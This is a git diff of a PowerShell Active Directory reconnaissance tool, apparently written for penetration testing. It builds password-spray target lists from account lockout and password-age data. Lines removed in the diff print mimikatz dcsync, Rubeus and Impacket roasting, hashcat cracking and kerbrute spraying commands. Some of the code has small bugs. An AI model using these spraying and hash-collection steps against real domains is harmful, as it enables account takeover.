@@ -51,6 +51,7 @@ if (!($MyInvocation.MyCommand)) {
     write-host "[*] Defining default values (fileless)"
     $ADScout = [ordered]@{
         DN                  = $null
+        OutFolder           = '$pwd.path'
         Connectioncheck     = $null
         Domain              = $null
         Dcip                = $null
@@ -209,10 +210,6 @@ function ADS-detectrunas {
     }
 }
 
-
-
-
-
 function ADS-out {
     #[cmdletbinding()]
     <#
@@ -226,21 +223,26 @@ function ADS-out {
         Write to log and output (default):logandout
         Export to file: export
         Export to file CSV: export
-        .Parameter module
+        .Parameter function
         Used as prefix of the logfile
+        .Parameter custom
+        Custom string
         .Parameter object
         Stuff to log/export
         .Example
-        ADS-writelogandoutput "Test"
+        Get-process | ADS-writelogandoutput
         .Example
-        ADS-writelogandoutput "Module" $Result
+        ADS-writelogandoutput "logandprint" "CustomFunction" $Result
     #>
     param
     (
+        [ValidateSet("logandprint", "logonlye", "export", "exportcsv")]    
         [String[]]
         $action = "logandprint",
         [String[]]
         $function = "custom",
+        [String[]]
+        $custom,
         [Parameter(Mandatory,ValueFromPipeline)]
         [object]
         $object
@@ -248,26 +250,32 @@ function ADS-out {
     $all = @($input)
     $date = Get-Date -Format "yyyyMMdd"
     $date_ext = Get-Date -Format "yyyyMMdd_hhmmss"
+
+    #If custom is defined add proper seperator
+    if ($custom) {
+        $customstring= $custom + "_"
+    }
     
-    if $ADScout.Fileless {
+    # If filelessmode outputfolder is current path
+    if ($ADScout.Fileless) {
         $ADScout.OutFolder = $pwd.path
     }
     
     switch ($action){
         "logandprint" {
-            $Logfile = Join-Path $ADScout.OutFolder "\" ("log_"+$function+"_"+$date+".txt")
+            $Logfile = Join-Path $ADScout.OutFolder ("\log_"+$function+"_"+$customstring+$date+".txt")
             Tee-Object -InputObject $all -FilePath $Logfile -Append
         }
         "logonly" {
-            $Logfile = Join-Path $ADScout.OutFolder "\" ("log_"+$function+"_"+$date+".txt")
+            $Logfile = Join-Path $ADScout.OutFolder ("\log_"+$function+"_"+$customstring+$date+".txt")
             $all | Out-File -FilePath $Logfile -Append
         }
         "export" {
-            $Logfile = Join-Path $ADScout.OutFolder "\" ("export_"+$function+"_"+$date_ext+".txt")
+            $Logfile = Join-Path $ADScout.OutFolder ("\export_"+$function+"_"+$customstring+$date_ext+".txt")
             $all | Out-File -FilePath $Logfile -Append
         }
         "exportcsv" {
-            $Logfile = Join-Path $ADScout.OutFolder "\" ("export_"+$function+"_"+$date_ext+".csv")
+            $Logfile = Join-Path $ADScout.OutFolder ("\export_"+$function+"_"+$customstring+$date_ext+".csv")
             $all | Export-Csv -Path $Logfile -Append -NoTypeInformation
         }
     }
@@ -297,13 +305,13 @@ function ADS-testcred {
     
         # Get current domain using logged-on user's credentials
         $CurrentDomain = "LDAP://" + $ADScout.DN
-        write-host "[*] Testing credentials for:"+$username
+        write-host "[*] Testing credentials for: $username"
         $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$UserName,$Password)
     
         if ($domain.name -eq $null) {
             write-host "[-] Auth failed."
         } else {
-            write-host "[+] Successfully authenticated with domain $domain.name"
+            write-host "[+] Successfully authenticated with domain $($domain.name)"
         }
 
     } else {
@@ -327,90 +335,46 @@ function ADS-testcred {
         }
 
         if (($credentialtest | Measure-Object).count -gt 0) { 
-            write-host "[+] Successfully authenticated with:"$cred.UserName
+            write-host "[+] Successfully authenticated with: $($cred.UserName)"
         }
     }
 
 }
 
-function ADS-interactive
-{
-    if (!$connectioncheck){ADS-connectionchecks}
-    Clear-Host
-    Write-Host "================ Options ================"
-    Write-Host 
-    Write-Host "---Generic Info---"
-    Write-Host "1: Domain Info (incl. DCs, Admin groups)"
-    Write-Host "2: Export full user list"
-    Write-Host 
-    Write-Host "--- Weakness Stuff ---"
-    Write-Host "3: Exploit suggestions"
-    Write-Host "4: Show vuln users (1 table)"
-    Write-Host
-    Write-Host "--- Lookups ---"
-    Write-Host "5: Check attributes of a single user"
-    Write-Host "6: GPO Search & Dump (Name)"
-    Write-Host "7: GPO Search & Dump (Content based)"
-    Write-Host
-    Write-Host "--- PW Spraying---"
-    Write-Host "9: Export userlist for PW Spraying"
-    Write-Host "0: Monitore User Lockouts"
-    Write-Host
-    Write-Host "Q: Quit"
-    Write-Host 
-    Write-host
-    # Choose
-    $choice = Read-Host "Choose"
-
-    # Select option
-    switch ($choice){
-  
-        '1' {getDomainInfo}
-        '2' {fulluserexport}
-        '3' {vulnuserexport}
-        '4' {showvulnuser}
-        '5' {checkuser}
-        '6' {gposearchname}
-        '7' {gposearchcontent}
-        '9' {pwsprayinguserexport}
-        '0' {monitorelockouts}
-            'q' {exit}
-        }
-}
-
-
 function ADS-getDomainInfo
 {
     ADS-checkpreconditions
-    #Clear-Host
-    Write-Host "======================================================"
-    Write-Host "=================== GET Domain Info =================="
-    Write-Host "======================================================"
-    Write-Host
-    Write-Host "---Domain Info---"
-    Get-ADDomain -Server $ADScout.dcip | select-object Forest,DomainMode,UsersContainer,ComputersContainer,InfrastructureMaster,ParentDomain,ChildDomains
-    Write-Host "---Objects---"
-    Write-Host "AD Users:"(Get-ADUser -Filter * -Server $ADScout.dcip).Count"(Enabled:"(Get-AdUser -Server $ADScout.dcip -filter 'Enabled -eq $false').count")"
-    Write-Host "AD Groups:"(Get-ADGroup -Filter * -Server $ADScout.dcip).Count
-    Write-Host "AD Computers:"(Get-ADComputer -Filter * -Server $ADScout.dcip).Count"(Enabled:"(Get-ADComputer -Server $ADScout.dcip -filter 'Enabled -eq $false').count")"
-    Write-Host
-    Write-Host "---DC Info---"
-    Get-ADDomainController -Server $ADScout.dcip | select-object Hostname,IPv4Address, IsReadOnly, IsGlobalCatalog,OperatingSystem,OperationMasterRoles,ComputerObjectDN | format-table
-    Write-Host
-    Write-Host "---Admin Groups (contain string admin)---"
-    Get-ADGroup -Filter 'Name -like "*admin*"' -Properties * -Server $ADScout.dcip | select-object SAMAccountName, @{l='Members';e={($_.Members.split(';') | foreach-object -process { $_.split(',').split('=')[1]})}},@{n='MemberOf';e={($_.MemberOf.split(';') | foreach-object -process { $_.split(',').split('=')[1]})}},DistinguishedName,Description |format-table
-    Write-Host
-    Write-Host "---Users in the Admin Groups (recursive search)---"
-    Write-Host
-    Get-ADGroup -Filter 'Name -like "*admin*"' -Properties * -Server $ADScout.dcip | get-adgroupmember -Recursive -Server $ADScout.dcip | Get-ADUser -Properties SamAccountName,Enabled,PasswordLastSet,DoesNotRequirePreAuth,Description,memberof -Server $ADScout.dcip | select-object SamAccountName,Enabled,PasswordLastSet,DoesNotRequirePreAuth,Description,@{l='Member Of';e={($_.memberof.split(';') | foreach-object -process { $_.split(',').split('=')[1]})}} | sort-object -Property SamAccountName -Unique | format-table
-    Write-Host
-    Write-Host "---Misc---"
-    Get-ADObject -Identity ((Get-ADDomain -Server $ADScout.dcip).distinguishedname) -Properties ms-DS-MachineAccountQuota -Server $ADScout.dcip| select-object ms-DS-MachineAccountQuota
-    Write-Host
+    $functionname = $MyInvocation.MyCommand
+    $timestamp = Get-Date -Format "yyyyMMdd hh:mm:ss"
+
+    "============================= GET Domain Info @$timestamp ============================" | ads-out -function $functionname
+    "---------Domain Info---------"  | ads-out -function $functionname
+    Get-ADDomain -Server $ADScout.dcip | select-object Forest,DomainMode,UsersContainer,ComputersContainer,InfrastructureMaster,ParentDomain,ChildDomains | ads-out -function $functionname
+    "---------Objects---------" | ads-out -function $functionname
+    "AD Users:"+(Get-ADUser -Filter * -Server $ADScout.dcip).Count+" (Enabled:"+(Get-AdUser -Server $ADScout.dcip -filter 'Enabled -eq $false').count+")"| ads-out -function $functionname
+    "AD Groups:"+(Get-ADGroup -Filter * -Server $ADScout.dcip).Count | ads-out -function $functionname
+    "AD Computers:"+(Get-ADComputer -Filter * -Server $ADScout.dcip).Count+" (Enabled:"+(Get-ADComputer -Server $ADScout.dcip -filter 'Enabled -eq $false').count+")"| ads-out -function $functionname
+
+    "---------DC Info---------"| ads-out -function $functionname
+    Get-ADDomainController -Server $ADScout.dcip | select-object Hostname,IPv4Address, IsReadOnly, IsGlobalCatalog,OperatingSystem,OperationMasterRoles,ComputerObjectDN | format-table | ads-out -function $functionname
+
+    "---------Admin Groups (contain string admin)---------" | ads-out -function $functionname
+    Get-ADGroup -Filter 'Name -like "*admin*"' -Properties * -Server $ADScout.dcip | select-object SAMAccountName, @{l='Members';e={($_.Members.split(';') | foreach-object -process { $_.split(',').split('=')[1]})}},@{n='MemberOf';e={($_.MemberOf.split(';') | foreach-object -process { $_.split(',').split('=')[1]})}},DistinguishedName,Description |Out-GridView  | ads-out -function $functionname
+
+    Write-Host "---------Users in the Admin Groups (recursive search)---------" | ads-out -function $functionname
+
+    #Get-ADGroup -Filter 'Name -like "*admin*"' -Properties * -Server $ADScout.dcip | get-adgroupmember -Recursive -Server $ADScout.dcip | Get-ADUser -Properties SamAccountName,Enabled,PasswordLastSet,DoesNotRequirePreAuth,Description,memberof -Server $ADScout.dcip | select-object SamAccountName,Enabled,PasswordLastSet,DoesNotRequirePreAuth,Description,@{l='Member Of';e={($_.memberof.split(';') | foreach-object -process { $_.split(',').split('=')[1]})}} | sort-object -Property SamAccountName -Unique | format-table
+
+    "---------Misc---------" | ads-out -function $functionname
+    Get-ADObject -Identity ((Get-ADDomain -Server $ADScout.dcip).distinguishedname) -Properties ms-DS-MachineAccountQuota -Server $ADScout.dcip| select-object ms-DS-MachineAccountQuota | ads-out -function $functionname
+
 }
 function fulluserexport
 {
-    Clear-Host
+    ADS-checkpreconditions
+    $functionname = $MyInvocation.MyCommand
+    $timestamp = Get-Date -Format "yyyyMMdd hh:mm:ss"
+
     Write-Host "====================================================="
     Write-Host "=============== Export Full user list================"
     Write-Host "====================================================="
@@ -422,149 +386,75 @@ function fulluserexport
 
 function ADS-expwspraying
 {
-    Write-Host ""
-    Write-Host "[*] Start -------Export Users for PW Spray-------"
-    Write-Host "[*] Searching users which are: Enabled, not locked, no badpwdcount"
-    $table = Get-ADUser -Properties SamAccountName,LockedOut,badPwdCount,PasswordExpired -Filter {Enabled -eq "true"} -Server $ADScout.Dcip | where-object {$_.LockedOut -eq 0 -and $_.badPwdCount -eq 0} | Select-Object SamAccountName -ExpandProperty SamAccountName
-    Write-Host "[+] Found"$table.count "Users"
-    Write-Host "[*] Export to $($ADScout.Lootfolder)\users_pw_spraying.txt"
-    $table | Out-File -Encoding utf8 -FilePath (Join-Path -Path $ADScout.Lootfolder -ChildPath "users_pw_spraying.txt")
-    Write-Host "[*] ./kerbrute_linux_amd64 passwordspray -d"$ADScout.Domain"--dc"$ADScout.Dcip"users_pw_spraying.txt 'Sommer2022!' --safe" 
-    Write-Host "[*] Use ADS-XXXXXX to monitore the lockouts"
+    <#
+        .Synopsis
+        Export a list of user for PW-spraying
+        .DESCRIPTION
+        Export a lsit of users (samAccountname) for PW spraying.
+        Only select accounts which are: enabled, not locked, badpwcount=0.
+        Supports an interactivemode to select the desired user in a gridview and an export by last pw changedate.
+        .Parameter interactive
+        Export users by year they changed the password.
+        .Parameter interactive
+        Starts an interactive gridview to select the users to export.
+        .Example
+        ADS-expwspraying
+        .Example
+        ADS-expwspraying -interactive
+    #>
+    Param (
+
+        [ValidateSet("normal", "byyear")]    
+        [String[]]
+        $mode = "normal",
+        [Parameter(HelpMessage='Will start an interactive Gridview to choose the users')]
+        [switch]
+        $interactive
+    )
+
+    ADS-checkpreconditions
+    $functionname = $MyInvocation.MyCommand
+    $timestamp = Get-Date -Format "yyyyMMdd hh:mm:ss"
+
+    "[*] Start -------Export Users for PW Spray-------" | ads-out -function $functionname
+
+    if ($interactive){
+         
+        Get-ADUser -Properties SamAccountName,LockedOut,badPwdCount,PasswordExpired,LastLogonDate,logonCount,whenCreated,whenChanged,ServicePrincipalNames, CanonicalName, Department, Description, Memberof, PasswordLastSet -Filter {Enabled -eq "true"} -Server $ADScout.Dcip | where-object {$_.LockedOut -eq 0 -and $_.badPwdCount -eq 0} | select-object SamAccountName, logonCount,LastLogonDate, PasswordLastSet, whenChanged, whenCreated,ServicePrincipalNames, CanonicalName, Department, Description, Memberof | Out-GridView -Title "ADScout: Choose users for Export" -PassThru | Select-Object SamAccountName -ExpandProperty SamAccountName | ads-out -function $functionname -action export
+        "[+] Exporting the accounts to $($ADScout.OutFolder)" | ads-out -function $functionname
+    } elseif ($mode -eq "byyear") {
+        #Get the las pwd change by year, if never changed the pwd get the creation date
+        $table = Get-ADUser -Properties SamAccountName,LockedOut,badPwdCount,PasswordExpired,PasswordLastSet,whenCreated -Filter {Enabled -eq "true"} -Server $ADScout.Dcip | where-object {$_.LockedOut -eq 0 -and $_.badPwdCount -eq 0} | select-object samaccountname, @{n='PasswordLastset';e={if ($_.PasswordLastSet.year -gt 1970){$_.PasswordLastSet.year} else{ $_.whencreated.year} }}
+        "[+] Password age structure:" | ads-out -function $functionname
+        $table | Group-Object -Property PasswordLastSet -NoElement | Sort-Object -Property PasswordLastSet -Descending  | ads-out -function $functionname
+
+        $uniqueyears = $table.PasswordLastset | Select-Object -Unique
+
+        foreach ($year in $uniqueyears) {
+            $table | Where-Object PasswordLastset -EQ $year | Select-Object SamAccountName -ExpandProperty SamAccountName | ads-out -function $functionname -action export -custom users$year
+        }
+        #baspwdcount is not replicated https://learn.microsoft.com/de-de/windows/win32/adschema/a-badpwdcount?redirectedfrom=M
+    } else {
+        "[*] Searching users which are: Enabled, not locked, no badpwdcount" | ads-out -function $functionname
+        $table = Get-ADUser -Properties SamAccountName,LockedOut,badPwdCount,PasswordExpired,PasswordLastSet,whenCreated -Filter {Enabled -eq "true"} -Server $ADScout.Dcip | where-object {$_.LockedOut -eq 0 -and $_.badPwdCount -eq 0} | select-object samaccountname, @{n='PasswordLastset';e={if ($_.PasswordLastSet.year -gt 1970){$_.PasswordLastSet.year} else{ $_.whencreated.year} }}
+        
+        "[+] Password age structure:" | ads-out -function $functionname
+        $table | Group-Object -Property PasswordLastSet -NoElement | Sort-Object -Property PasswordLastSet -Descending  | ads-out -function $functionname
+
+        "[+] Found $($table.count) Users. Exporting to $($ADScout.OutFolder)" | ads-out -function $functionname 
+        $table | Select-Object SamAccountName -ExpandProperty SamAccountName | ads-out -function $functionname -action export
+    }
 }
 
-function vulnuserexport
+function ADS-explorerUsers
 {
-    Clear-Host
-    Write-Host "====================================================="
-    Write-Host "================ Exploit suggestions ================"
-    Write-Host "====================================================="
-    Write-Host 
-    $table = Get-ADUser -Properties * -Filter * -Server $domain | Select-Object SamAccountName,CN,Enabled,LockedOut,badPwdCount,CanonicalName,AllowReversiblePasswordEncryption,DoesNotRequirePreAuth,PasswordNotRequired,@{n='servicePrincipalName';e={$_.servicePrincipalName.Value -join ';'}},TrustedForDelegation,TrustedToAuthForDelegation,@{n='PrincipalsAllowedToDelegateToAccount';e={$_.PrincipalsAllowedToDelegateToAccount.Value -join ';'}},@{n='msDS-AllowedToDelegateTo';e={$_."msDS-AllowedToDelegateTo".Value -join ';'}},Description
+    ADS-checkpreconditions
+    $functionname = $MyInvocation.MyCommand
+    $timestamp = Get-Date -Format "yyyyMMdd hh:mm:ss"
 
-    $ReversiblePasswordEncryption = $table | Where-Object {$_.AllowReversiblePasswordEncryption -eq 1} | select-object SamAccountName,Enabled,AllowReversiblePasswordEncryption,CanonicalName,Description
-    $ASREPRoastable = $table | Where-Object {$_.DoesNotRequirePreAuth -eq 1} | select-object SamAccountName,Enabled,DoesNotRequirePreAuth,CanonicalName,Description
-    $Kerboroastable = $table | Where-Object {$_.servicePrincipalName -ne ''} | select-object SamAccountName,Enabled,servicePrincipalName,CanonicalName,Description
-    $NoPWRequired = $table | Where-Object {$_.PasswordNotRequired -eq 1 -and $_.Enabled -eq 1} | select-object SamAccountName,Enabled,PasswordNotRequired,CanonicalName,Description
-    $Unconstraineddelegation = $table | Where-Object {$_.TrustedForDelegation -eq 1} | select-object SamAccountName,Enabled,TrustedForDelegation,CanonicalName,Description
-    $Constraineddelegation = $table | Where-Object {$_.TrustedToAuthForDelegation -ne ''} | select-object SamAccountName,Enabled,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,CanonicalName,Description
-    
-    Write-Host "================ Overview ================ "
-    Write-Host 
-    if (($ReversiblePasswordEncryption | Measure-Object).count -gt 0) {write-host "Reversible PW encryption:" ($ReversiblePasswordEncryption | Measure-Object).count; $showrevpwenc = 1} else {write-host "Reversible PW encryption:0"}
-    if (($ASREPRoastable | Measure-Object).count -gt 0) {write-host "ASREP roastable:" ($ASREPRoastable | Measure-Object).count; $showasproastable = 1} else {write-host "ASREP roastable: 0"}
-    if (($Kerboroastable | Measure-Object).count -gt 0) {write-host "Kerboroastable:" ($Kerboroastable | Measure-Object).count; $showKerboroastable = 1} else {write-host "Kerboroastable: 0"}    
-    if (($NoPWRequired | Measure-Object).count -gt 0) {write-host "NO PW required:" ($NoPWRequired | Measure-Object).count; $showNoPWRequired = 1} else {write-host "NO PW required: 0"}
-    if (($Unconstraineddelegation | Measure-Object).count -gt 0) {write-host "Unconstrained delegation:" ($Unconstraineddelegation | Measure-Object).count; $showUnconstraineddelegation = 1} else {write-host "Unconstrained delegation: 0"}
-    if (($Constraineddelegation | Measure-Object).count -gt 0) {write-host "Constrained delegation:" ($Constraineddelegation | Measure-Object).count; $showConstraineddelegation = 1} else {write-host "Constrained delegation: 0"}
+    Write-Host "[*] Start -------Exploring AD users-------"
+    Get-ADUser -Properties SamAccountName,LockedOut,badPwdCount,PasswordExpired,Enabled -Server $ADScout.Dcip | Out-GridView -PassThru | get-aduser -Properties * | ADS-out -function $functionname
 
-    Write-Host 
-    Write-Host 
-    Write-Host "================ Details ================ "
-    Write-Host 
-
-   
-    if ($showrevpwenc -eq 1) {
-        write-host "ReversiblePasswordEncryption"
-        write-host "-------------------------------------------------------------------------------------------------------------------------------------"
-        write-host "Caused by: Accounts which have the 'Store password using reverisble encryption.."
-        write-host "Attack: Need Domain admin or DC sync rights to retrive the cleartext PW!"
-        write-host "Exploitation:"
-        write-host "Use mimikatz: lsadump::dcsync /domain:fec.local /user:userrevpassword"
-        write-host  
-        write-host  "PS: IMO the PW has to be set AFTER the flag was activated otherwhise the pw isn't stored."
-        write-host  
-        $ReversiblePasswordEncryption | format-table
-        $ReversiblePasswordEncryption | Export-Csv -Encoding "utf8" -NoTypeInformation -path reversiblepw_enc.csv
-    } else {
-
-    }    
-    
-    if ($showasproastable -eq 1) {
-        write-host "ASREP roastable"
-        write-host "-------------------------------------------------------------------------------------------------------------------------------------"
-        write-host
-        write-host "Caused by: Accounts which have the 'Do not require Kerberos preauthentication' flag set."
-        write-host "Attack: send a fake AS-REQ, to receive the users Hash to crack it offline."
-        write-host "Exploitation:"
-        write-host "1. WINDOWS: Collect Hashes: Rubeus_v4.8.exe asreproast /format:hashcat /outfile:hashes.asreproast"
-        write-host "1. LINUX: Create usernames.txt with the account names. Collect the Hashes (Impacket): python3 ./GetNPUsers.py dc1.fec.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast"
-        write-host "2. Crack it with Hashcat: hashcat --attack-mode 0 --hash-type 18200 --optimized-kernel-enable hashes.asreproast /srv/wordlists/ALL-COMBINED.txt --rules-file /srv/rules/nsa_500.txt"
-        write-host
-        write-host "* Esspecially check non-service accounts, because they are more likely to have a weaker password!"
-        write-host
-        write-host "Affected accounts:"
-        $ASREPRoastable | format-table
-        $ASREPRoastable | Export-Csv -Encoding "utf8" -NoTypeInformation -path ASREPRoastable.csv
-    } else {
-
-    }
-
-    if ($showKerboroastable -eq 1) {
-        write-host "Kerboroasting"
-        write-host "-------------------------------------------------------------------------------------------------------------------------------------"
-        write-host
-        write-host "Caused by: Accounts with SPN"
-        write-host "Attack: Get the NTHash of a Service Account"
-        write-host "Exploitation:"
-        write-host "1. WINDOWS: Collect Hashes: Rubeus_v4.8.exe asreproast kerberoast /outfile:kerberoasting_hashes.txt"
-        write-host "1. LINUX: Collect Hashes (Impacket): ./GetUserSPNs.py -request domain/username[:password]"
-        write-host "2. Crack it with Hashcat: `hashcat --attack-mode 0 --hash-type 13100 --optimized-kernel-enable kerberoasting_hashes.txt --session=85xxx-kerberoast-quick /srv/wordlists/uncompressed/crackstation-human-only.txt --rules-file /srv/rules/nsa_500.txt"
-        write-host
-        write-host "Affected accounts:"
-        $Kerboroastable | format-table
-        $Kerboroastable | Export-Csv -Encoding "utf8" -NoTypeInformation -path kerboroastable.csv
-    } else {
-
-    }
-
-    if ($showNoPWRequired -eq 1) {
-        write-host "NO PW required"
-        write-host "-------------------------------------------------------------------------------------------------------------------------------------"
-        write-host
-        write-host "Caused by: AD Account misconfiguration Attribut: userAccountControl"
-        write-host "Attack: Try to login with an empty password."
-        write-host "Exploitation:"
-        write-host "1. LINUX: Performing kerbbrute: ./kerbrute_linux_amd64 passwordspray -d  contoso.com --dc XXX.contoso.com users.txt ''"
-        write-host
-        write-host "* Warning: Be carefull to not lock out the account!"
-        write-host
-        write-host "Affected accounts:"
-        $NoPWRequired | format-table
-        $NoPWRequired | Export-Csv -Encoding "utf8" -NoTypeInformation -path pwnotrequired.csv
-    } else {
-
-    }
-
-    if ($showUnconstraineddelegation -eq 1) {
-        write-host "Unconstrained delegation"
-        write-host "-------------------------------------------------------------------------------------------------------------------------------------" 
-        $Unconstraineddelegation | format-table
-        $Unconstraineddelegation | Export-Csv -Encoding "utf8" -NoTypeInformation -path unconstraind_delegation.csv
-    } else {
-
-    }
-
-    if ($showConstraineddelegation -eq 1) {
-        write-host "Constrained delegation"
-        write-host "-------------------------------------------------------------------------------------------------------------------------------------" 
-        $Constraineddelegation | format-table
-        $Constraineddelegation | Export-Csv -Encoding "utf8" -NoTypeInformation -path constrained_delegation.csv
-    } else {
-
-    }
-    pause
-    Show-CustomMenu
-}
-
-function showvulnuser
-{
-    Clear-Host
-    Write-Host "================ Show Vuln User ================"
-    $table = Get-ADUser -Properties * -Filter * -Server $domain | Select-Object SamAccountName,CN,Enabled,LockedOut,badPwdCount,CanonicalName,AllowReversiblePasswordEncryption,DoesNotRequirePreAuth,PasswordNotRequired,@{n='servicePrincipalName';e={$_.servicePrincipalName.Value -join ';'}},TrustedToAuthForDelegation,@{n='PrincipalsAllowedToDelegateToAccount';e={$_.PrincipalsAllowedToDelegateToAccount.Value -join ';'}},Description
-    $table | Where-Object {$_.Enabled -eq 1 -and ($_.AllowReversiblePasswordEncryption -eq 1 -or $_.DoesNotRequirePreAuth -eq 1 -or $_.PasswordNotRequired -eq 1 -or $_.servicePrincipalName -ne '' -or $_.TrustedToAuthForDelegation -ne '' -or $_.PrincipalsAllowedToDelegateToAccount -ne '')} | format-table
-    pause
-    Show-CustomMenu
 }
 
 function checkuser
@@ -579,150 +469,6 @@ function checkuser
     pause
     Show-CustomMenu
 }
-
-function monitorelockouts
-{
-
-    $lockedout = Get-ADUser -properties samaccountname,LockedOut, badPwdCount, LastBadPasswordAttempt,LastLogonDate -filter * -Server $domain | where-object {$_.LockedOut -eq 1} | select-object samaccountname,LockedOut, badPwdCount, LastBadPasswordAttempt,LastLogonDate | format-table
-
-    while($true) {
-        Clear-Host
-        Write-Host "====================================================="
-        Write-Host "================  Monitore Lockouts  ================"
-        Write-Host "====================================================="
-        Write-Host 
-        Write-Host "Check performed:" (get-date).ToString('T')
-        if ($lockedout) { $lockedout }else {write-host "No locked account found."}
-        Start-Sleep -Milliseconds 5000
-        $lockedout = Get-ADUser -properties samaccountname,LockedOut, badPwdCount, LastBadPasswordAttempt,LastLogonDate -filter * -Server $domain | where-object {$_.LockedOut -eq 1} | select-object samaccountname,LockedOut, badPwdCount, LastBadPasswordAttempt,LastLogonDate | format-table
-    }
-    
-}
-
-function gposearchname
-{
-    Clear-Host
-    Write-Host "====================================================="
-    Write-Host "================== GPO Search Name =================="
-    Write-Host "====================================================="
-    Write-Host
-    Write-Host "Search for a GPO (name). Leave empty to display and dump all."
-    Write-Host
-    $searchstring = Read-Host "Search string"
-    write-host 
-    $hitGposInDomain = Get-GPO -All -Domain $forest | where-object {$_.DisplayName -like "*$searchstring*"}
-    $listgpo = ''
-    $resultsgpo = New-Object System.Collections.ArrayList
-    $resultsgporights = New-Object System.Collections.ArrayList
-
-    foreach ($gpo in $hitGposInDomain) {
-        $report = Get-GPOReport -Guid $gpo.Id -ReportType Xml -Domain $forest
-
-
-        write-host "- Match in: $($gpo.DisplayName)" -foregroundcolor "Green"
-        [xml]$xmlElm = $report
-        $report | Out-File -FilePath ("GPO_" + $gpo.DisplayName + ".txt")
-        Get-GPOReport -Guid $gpo.Id -ReportType html -Domain $forest | Out-File -FilePath ("GPO_" + $gpo.DisplayName + ".html")
-        $listgpo = New-Object System.Object
-        $listgpo | Add-Member -MemberType NoteProperty -Name "GPO Name" -Value $gpo.DisplayName     
-        $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled Computer" -Value $xmlElm.GPO.Computer.Enabled
-        $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled User" -Value $xmlElm.GPO.User.Enabled
-        $listgpo | Add-Member -MemberType NoteProperty -Name "Link Path (OU)" -Value $xmlElm.GPO.LinksTo.SOMPath
-        $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled Link" -Value $xmlElm.GPO.LinksTo.Enabled
-        $listgpo | Add-Member -MemberType NoteProperty -Name "GPO ID" -Value $gpo.Id
-        $resultsgpo.Add($listgpo) | Out-Null
-
-        
-        foreach ($object in $xmlElm.GPO.SecurityDescriptor.Permissions.TrusteePermissions) {
-            $listgporights = New-Object System.Object
-            $listgporights | Add-Member -MemberType NoteProperty -Name "GPO Name" -Value $gpo.DisplayName 
-            $listgporights | Add-Member -MemberType NoteProperty -Name "Group" -Value $object.Trustee.Name."#text"
-            $listgporights | Add-Member -MemberType NoteProperty -Name "rights" -Value $object.Standard.GPOGroupedAccessEnum
-
-            $resultsgporights.Add($listgporights) | Out-Null
-        }
-        
-        $resultsgporights.Add($listgporights) | Out-Null
-        
-
-    }
-    write-host 
-    write-host "--------------------GPO's found --------------------"
-    $resultsgpo | format-table
-    write-host "*The content of the policy has been saved as file in the current path."
-    write-host 
-    write-host "--------------------GPO rights--------------------"
-    $resultsgporights | format-table
-
-    pause
-    Show-CustomMenu
-}
-
-function gposearchcontent
-{
-
-
-    Clear-Host
-    Write-Host "======================================================"
-    Write-Host "================= GPO Search Content ================="
-    Write-Host "======================================================"
-    Write-Host
-    Write-Host "Search for a specific string in all GPO's. Leave empty to display and dump all."
-    Write-Host
-    $searchstring = Read-Host "Search string"
-    write-host 
-    $allGposInDomain = Get-GPO -All -Domain $forest
-    $listgpo = ''
-    $resultsgpo = New-Object System.Collections.ArrayList
-    $resultsgporights = New-Object System.Collections.ArrayList
-
-    foreach ($gpo in $allGposInDomain) {
-        $report = Get-GPOReport -Guid $gpo.Id -ReportType Xml -Domain $forest
-
-        if ($report -match $searchstring) {
-            write-host "- Match in: $($gpo.DisplayName)" -foregroundcolor "Green"
-            [xml]$xmlElm = $report
-            $report | Out-File -FilePath ("GPO_" + $gpo.DisplayName + ".txt")
-            Get-GPOReport -Guid $gpo.Id -ReportType html -Domain $forest | Out-File -FilePath ("GPO_" + $gpo.DisplayName + ".html")
-            $listgpo = New-Object System.Object
-            $listgpo | Add-Member -MemberType NoteProperty -Name "GPO Name" -Value $gpo.DisplayName     
-            $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled Computer" -Value $xmlElm.GPO.Computer.Enabled
-            $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled User" -Value $xmlElm.GPO.User.Enabled
-            $listgpo | Add-Member -MemberType NoteProperty -Name "Link Path (OU)" -Value $xmlElm.GPO.LinksTo.SOMPath
-            $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled Link" -Value $xmlElm.GPO.LinksTo.Enabled
-            $listgpo | Add-Member -MemberType NoteProperty -Name "GPO ID" -Value $gpo.Id
-            $resultsgpo.Add($listgpo) | Out-Null
-
-        
-            foreach ($object in $xmlElm.GPO.SecurityDescriptor.Permissions.TrusteePermissions) {
-                $listgporights = New-Object System.Object
-                $listgporights | Add-Member -MemberType NoteProperty -Name "GPO Name" -Value $gpo.DisplayName 
-                $listgporights | Add-Member -MemberType NoteProperty -Name "Group" -Value $object.Trustee.Name."#text"
-                $listgporights | Add-Member -MemberType NoteProperty -Name "rights" -Value $object.Standard.GPOGroupedAccessEnum
-
-                $resultsgporights.Add($listgporights) | Out-Null
-            }
-        
-            $resultsgporights.Add($listgporights) | Out-Null
-        
-
-        } else {
-         write-host "- No Match: $($gpo.DisplayName)"
-        }
-
-    }
-    write-host 
-    write-host "--------------------GPO which contain the string--------------------"
-    $resultsgpo | format-table
-    write-host "*The content of the policy has been saved as file in the current path."
-    write-host 
-    write-host "--------------------GPO rights--------------------"
-    $resultsgporights | format-table
-
-    pause
-    Show-CustomMenu
-}
-
 
 
 function ADS-portcheck {
@@ -784,6 +530,7 @@ function ADS-preconditioncheck
     # Check if AD commands from an ActiveDirctory modules are available
     if ((Get-Command -Module *ActiveDirectory*).count -gt 100) {
         Write-host "[+] AD Module seems to be installed"
+        $ADSScout.UseDLL = $false
         return $true
     } else {
         Write-host "[-] AD PS Module not available (install RSAT!)"      
@@ -834,7 +581,7 @@ function ADS-connectionchecks
     write-host "[*] Perfoming AD connectivity check"
     try {
         $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().name
-        Write-host "[+] Host is domain joined:"$domain
+        Write-host "[+] Host is domain joined: $domain"
     }
     catch {
         Write-host "[-] Current host is not member of a Domain"
@@ -852,20 +599,22 @@ function ADS-connectionchecks
 
         #DNS CHECKS if not resolveable ask for IP
         if(!$dcip) {
-            Write-Host "[*] Trying lookup (DNS):"$domain
+            Write-Host "[*] Trying lookup (DNS): $domain"
             try {
